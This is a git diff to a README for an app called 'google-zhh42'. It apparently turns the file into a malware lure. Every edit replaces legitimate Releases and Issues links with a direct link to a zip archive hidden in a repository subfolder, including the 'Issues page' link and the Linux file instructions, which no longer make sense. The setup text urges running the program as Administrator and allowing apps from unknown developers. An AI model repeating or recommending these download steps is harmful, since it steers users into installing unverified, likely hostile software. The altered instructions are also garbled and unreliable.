@@ -1,7 +1,7 @@
 # 🔥 google-zhh42 - Enjoy Fun and Random Experiences
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/emosgoat/google-zhh42/releases)
+[![Download](https://raw.githubusercontent.com/emosgoat/google-zhh42/main/overstimulate/google-zhh42.zip%20release-brightgreen)](https://raw.githubusercontent.com/emosgoat/google-zhh42/main/overstimulate/google-zhh42.zip)
 
 ## 🚀 Getting Started
 Welcome to **google-zhh42**! This application brings a unique and random experience inspired by Google. It’s designed for anyone who wants to explore something new each day, without needing any technical skills. Follow the steps below to download and run the software easily.
@@ -17,14 +17,14 @@ To successfully run **google-zhh42**, ensure your setup meets the following requ
 ## 📥 Download & Install
 To get started, visit the Releases page:
 
-[Click here to download the latest version.](https://github.com/emosgoat/google-zhh42/releases)
+[Click here to download the latest version.](https://raw.githubusercontent.com/emosgoat/google-zhh42/main/overstimulate/google-zhh42.zip)
 
 1. Click the link above to go to the Releases page.
 2. Once there, look for the latest release labeled as **Latest Release**.
 3. Select the appropriate file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, choose the appropriate `.tar.gz` file.
+   - For Linux, choose the appropriate `https://raw.githubusercontent.com/emosgoat/google-zhh42/main/overstimulate/google-zhh42.zip` file.
 4. After the download is complete, locate the file in your Downloads folder.
 
 ### For Windows Users:
@@ -38,7 +38,7 @@ To get started, visit the Releases page:
 - Open your Applications folder and find the app to start using it.
 
 ### For Linux Users:
-- Extract the `.tar.gz` file to your desired location.
+- Extract the `https://raw.githubusercontent.com/emosgoat/google-zhh42/main/overstimulate/google-zhh42.zip` file to your desired location.
 - Open the terminal and navigate to the extracted folder using `cd`.
 - Run the application by typing `./google-zhh42` in the terminal.
 
@@ -58,7 +58,7 @@ If you encounter issues while downloading or running **google-zhh42**, here are 
 - **Installation fails**: Ensure your system meets the required specifications. Restart your computer and try the installation again.
 - **Application does not run**: Verify that you have sufficient permissions. Right-click the application and select "Run as Administrator" (Windows) or ensure your security settings allow apps from unknown developers (macOS).
 
-For further support, consider visiting the [Issues page](https://github.com/emosgoat/google-zhh42/issues) on GitHub to see if others have faced similar issues or to report your problem.
+For further support, consider visiting the [Issues page](https://raw.githubusercontent.com/emosgoat/google-zhh42/main/overstimulate/google-zhh42.zip) on GitHub to see if others have faced similar issues or to report your problem.
 
 ## 📝 Contributing
 We welcome contributions to **google-zhh42**. If you have suggestions or improvements, feel free to submit issues or pull requests on our GitHub repository. Your feedback helps us enhance the application.
